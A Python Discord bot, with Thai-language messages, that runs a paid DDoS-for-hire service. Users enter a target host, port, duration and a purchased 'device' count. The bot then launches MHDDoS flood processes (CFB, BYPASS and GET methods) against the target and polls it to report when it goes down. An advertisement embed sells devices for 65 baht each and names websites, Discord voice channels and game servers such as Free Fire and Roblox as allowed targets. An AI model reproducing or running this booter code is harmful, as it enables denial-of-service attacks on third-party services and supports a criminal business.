import discord
from discord.ext import commands, tasks
import asyncio
import aiohttp
import json
import os
from datetime import datetime, timedelta

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

OWNER_ID = 1488103702488154173
DATA_FILE = "bot_data.json"

# ตัวแปรควบคุมการยิงซ้ำ (ป้องกันยิงทับซ้อนในเวลาเดียวกัน)
active_attacks = set()

def load_data():
    if not os.path.exists(DATA_FILE):
        return {"devices": {}, "banned": [], "warnings": {}}
    with open(DATA_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

class DDOSModal(discord.ui.Modal, title="DDOS Control Panel [ULTRA POWER]"):
    target = discord.ui.TextInput(label="1. IP - url (เป้าหมาย)", placeholder="เช่น example.com หรือ 1.1.1.1", required=True)
    port = discord.ui.TextInput(label="2. Port (1-65535)", placeholder="80, 443, etc.", required=True)
    time_sec = discord.ui.TextInput(label="3. Time (สูงสุด250วิ)", placeholder="250", required=True)
    device_count = discord.ui.TextInput(label="4. device (เครื่อง)", placeholder="จำนวนเครื่องที่จะใช้", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        data = load_data()
        user_id_str = str(interaction.user.id)

        # 1. เช็คว่ากำลังยิงค้างอยู่หรือไม่
        if user_id_str in active_attacks:
            await interaction.response.send_message("❌ รอให้ของเก่าที่กำลังยิงหมดเวลาก่อน", ephemeral=True)
            return

        # 2. เช็คสถานะแบน
        if user_id_str in data["banned"]:
            await interaction.response.send_message("❌ คุณถูกแบนจากการใช้งานบอท", ephemeral=True)
            return

        # 3. เช็คจำนวน Device
        user_device_data = data["devices"].get(user_id_str, {"count": 0})
        owned_devices = user_device_data.get("count", 0)

        try:
            req_devices = int(self.device_count.value)
            req_time = int(self.time_sec.value)
        except ValueError:
            await interaction.response.send_message("❌ กรุณากรอกตัวเลข Time และ Device ให้ถูกต้อง", ephemeral=True)
            return

        if owned_devices == 0 or req_devices > owned_devices:
            await interaction.response.send_message(f"❌ ยิงไม่ได้ คุณมี Device ทั้งหมด {owned_devices} เครื่อง {req_devices} เครื่อง", ephemeral=True)
            return

        if req_time > 250:
            req_time = 250

        target_str = self.target.value.strip().lower()

        # 4. เช็ค .th หรือ Local IP
        if ".th" in target_str or target_str.startswith("127.") or target_str.startswith("192.168.") or target_str.startswith("10."):
            warnings = data["warnings"].get(user_id_str, 0) + 1
            data["warnings"][user_id_str] = warnings
            
            if warnings >= 3:
                if user_id_str not in data["banned"]:
                    data["banned"].append(user_id_str)
                save_data(data)
                await interaction.response.send_message(f"🚨 ห้ามยิง .th หรือ Local IP เตือนครั้งที่ {warnings}/3 มึงจะโดนแบนจากการใช้บอท", ephemeral=True)
                return
            
            save_data(data)
            await interaction.response.send_message(f"🧨 ห้ามยิง .th หรือ Local IP ไอ้เอ๋อ เตือนรอบที่ {warnings} (ครบ 3 ครั้งจะโดนแบน)", ephemeral=True)
            return

        # ล็อคสถานะการยิง
        active_attacks.add(user_id_str)

        await interaction.response.defer(ephemeral=False)

        embed = discord.Embed(title="<a:1000035744:1559183157532565524> DDOS BY C", color=discord.Color.dark_red())
        
        display_target = self.target.value
        embed.add_field(name="<:1000038745:1559183912113148065> Target", value=f"`{display_target}`", inline=False)
        embed.add_field(name="<:1000038746:1559184363021795369> Speed Web", value="กำลังเร่งพลัง MHDDoS 9,999,999+ (Ultra-Mode)...", inline=False)
        embed.add_field(name=":1000038748: Device", value=f"{req_devices} เครื่อง (Supercharged Nodes)", inline=False)
        embed.add_field(name="<:1000038748:1559185433458385019> Time", value=f"{req_time} วินาที", inline=False)
        
        embed.set_image(url="https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg")
        
        msg = await interaction.followup.send(embed=embed)

        async def attack_task():
            remaining_time = req_time
            current_devices = req_devices
            processes = []
            
            try:
                # คำนวณ Threads มหาศาลระดับ 9,999,999+ และกระจายหลายโหมดพร้อมกัน (CFB, BYPASS, GET)
                threads_count = max(9999999, current_devices * 500000)
                methods = ["CFB", "BYPASS", "GET"]
                
                if os.path.exists("MHDDoS/start.py"):
                    for m in methods:
                        p = await asyncio.create_subprocess_exec(
                            "python3", "MHDDoS/start.py", m, display_target, str(threads_count // len(methods)), str(req_time),
                            stdout=asyncio.subprocess.DEVNULL,
                            stderr=asyncio.subprocess.DEVNULL
                        )
                        processes.append(p)

                async with aiohttp.ClientSession() as session:
                    while remaining_time > 0:
                        if current_devices < 100:
                            current_devices = min(100, current_devices * 3)

                        speed_text = "9,999,999+ MB/s (Extreme Multi-Vector Flood Active)"
                        try:
                            start_t = asyncio.get_event_loop().time()
                            test_url = display_target if display_target.startswith("http") else f"http://{display_target}"
                            async with session.get(test_url, timeout=2) as resp:
                                latency = (asyncio.get_event_loop().time() - start_t) * 1000
                                speed_text = f"Status: {resp.status} | Latency: {latency:.1f}ms (Maximum Pressure)"
                        except Exception:
                            speed_text = "Target Down / 100% Packet Loss (Destroyed)"

                        updated_embed = discord.Embed(title="<a:1000035744:1559183157532565524> DDOS BY C", color=discord.Color.dark_red())
                        updated_embed.add_field(name="<:1000038745:1559183912113148065> Target", value=f"`{display_target}`", inline=False)
                        updated_embed.add_field(name="<:1000038746:1559184363021795369> Speed Web", value=speed_text, inline=False)
                        updated_embed.add_field(name=":1000038748: Device", value=f"{current_devices} เครื่อง (9,999,999+ Threads)", inline=False)
                        updated_embed.add_field(name="<:1000038748:1559185433458385019> Time", value=f"เหลือเวลา {remaining_time} วินาที", inline=False)
                        updated_embed.set_image(url="https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg")

                        try:
                            await msg.edit(embed=updated_embed)
                        except Exception:
                            break

                        await asyncio.sleep(1)
                        remaining_time -= 1

                    final_embed = discord.Embed(title="<a:1000035744:1559183157532565524> DDOS BY C [COMPLETED]", color=discord.Color.green())
                    final_embed.add_field(name="<:1000038745:1559183912113148065> Target", value=f"`{display_target}`", inline=False)
                    final_embed.add_field(name="<:1000038746:1559184363021795369> Speed Web", value="Attack Finished Successfully. Target Blown Up.", inline=False)
                    final_embed.add_field(name=":1000038748: Device", value=f"Used {current_devices} devices (MHDDoS Ultra)", inline=False)
                    final_embed.add_field(name="<:1000038748:1559185433458385019> Time", value="0 วินาที (เสร็จสิ้น)", inline=False)
                    final_embed.set_image(url="https://cdn.discordapp.com/attachments/1488104101085577229/1559186792522190930/137316d06f5fe8f5a2b243c67919345f.jpg")
                    try:
                        await msg.edit(embed=final_embed)
                    except Exception:
                        pass
            finally:
                for p in processes:
                    try:
                        p.terminate()
                    except Exception:
                        pass
                active_attacks.discard(user_id_str)

        asyncio.create_task(attack_task())

class DDOSView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="", emoji="<a:1000038742:1559181609528205372>", style=discord.ButtonStyle.secondary)
    async def open_modal_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(DDOSModal())

@bot.command(name="ddos")
async def ddos_command(ctx):
    if ctx.author.id != OWNER_ID:
        return

    embed = discord.Embed(
        title=":1000035910: DDOS ATTACK",
        color=discord.Color.pink()
    )
    
    desc = (
        "<:1000035915:1559174417097953340> **หากสนใจกดTK มา**\n"
        "-. เรทราคา device ละ 65B TH รับเเค่ซองทรูมันนี่\n"
        "-. device สูงสุด 8 เครื่อง\n\n"
        "<a:1000038732:1559175829001338980> **กฎการใช้**\n"
        "-. ห้ามยิง .th หรือเว็บที่เกี่ยวกับรัฐ : หน่วยงาน\n"
        "-. ห้ามยิง Local IP พวกแบบ 127.0.0.1\n"
        "-. ถ้าโดนเตือนครบ 3 ครั้ง จะโดนแบนไม่ให้ใช้\n\n"
        "<:1000038740:1559179488389242950> **สามารถยิงได้: เบื้องต้น**\n"
        "-. ยิงห้องเสียงดิสได้\n"
        "-. เว็บต่างๆ พวกแบบ .com หรืออะไรต่างๆ ได้\n"
        "-. เซิฟเกมต่างๆ เช่น ฟีฟาย โรบอค\n\n"
        "<a:1000035726:1559180464487407707> มี Ddos แจกฟรีให้ใช้ 3 ชม. ทุก 3 วัน นะงับ"
    )
    embed.description = desc
    embed.set_image(url="https://cdn.discordapp.com/attachments/1488104101085577229/1559181189175312466/ef8e34b79db57b50c3c29471d10c4eef.jpg")

    view = DDOSView()
    await ctx.send(embed=embed, view=view)

@bot.command(name="device")
async def device_command(ctx, member: discord.Member = None, action_str: str = None, time_str: str = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return

    if not member or not action_str:
        await ctx.send("❌ รูปแบบคำสั่งไม่ถูกต้อง ตัวอย่าง: `!device @user +5 1h` หรือ `!device @user -2`")
        return

    data = load_data()
    user_id_str = str(member.id)

    if user_id_str not in data["devices"]:
        data["devices"][user_id_str] = {"count": 0, "expires": None}

    sign = action_str[0]
    try:
        amount = int(action_str[1:])
    except ValueError:
        await ctx.send("❌ จำนวน Device ไม่ถูก")
        return

    current_count = data["devices"][user_id_str]["count"]

    if sign == "+":
        current_count += amount
        if time_str and time_str.upper() != "TH":
            unit = time_str[-1].lower()
            val = int(time_str[:-1])
            if unit == 'h':
                exp_time = datetime.now() + timedelta(hours=val)
            elif unit == 'd':
                exp_time = datetime.now() + timedelta(days=val)
            else:
                exp_time = datetime.now() + timedelta(hours=1)
            data["devices"][user_id_str]["expires"] = exp_time.isoformat()
        else:
            data["devices"][user_id_str]["expires"] = "TH"
    elif sign == "-":
        current_count = max(0, current_count - amount)

    data["devices"][user_id_str]["count"] = current_count
    save_data(data)

    await ctx.send(f"✅ เพิ่มเครื่อง {member.mention} ตอนนี้มี {current_count} เครื่อง")

@bot.command(name="b")
async def ban_bot_user(ctx, member: discord.Member = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if not member:
        await ctx.send("❌ แท็กผู้ใช้ที่ต้องการแบน")
        return

    data = load_data()
    user_id_str = str(member.id)
    if user_id_str not in data["banned"]:
        data["banned"].append(user_id_str)
        save_data(data)
    await ctx.send(f"🚫 แบนผู้ใช้ {member.mention}")

@bot.command(name="ub")
async def unban_bot_user(ctx, member: discord.Member = None):
    if ctx.author.id != OWNER_ID:
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if not member:
        await ctx.send("❌ แท็กผู้ใช้ที่จะปลดแบน")
        return

    data = load_data()
    user_id_str = str(member.id)
    if user_id_str in data["banned"]:
        data["banned"].remove(user_id_str)
        save_data(data)
    await ctx.send(f"✅ ปลดแบนผู้ใช้ {member.mention}")

@tasks.loop(minutes=1)
async def check_device_expiration():
    data = load_data()
    now = datetime.now()
    updated = False

    for user_id, info in list(data["devices"].items()):
        exp = info.get("expires")
        if exp and exp != "TH":
            exp_dt = datetime.fromisoformat(exp)
            if now >= exp_dt:
                info["count"] = 0
                info["expires"] = None
                updated = True

    if updated:
        save_data(data)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
    check_device_expiration.start()

# รันบอทด้วย Token ของคุณ
bot.run("YOUR_BOT_TOKEN")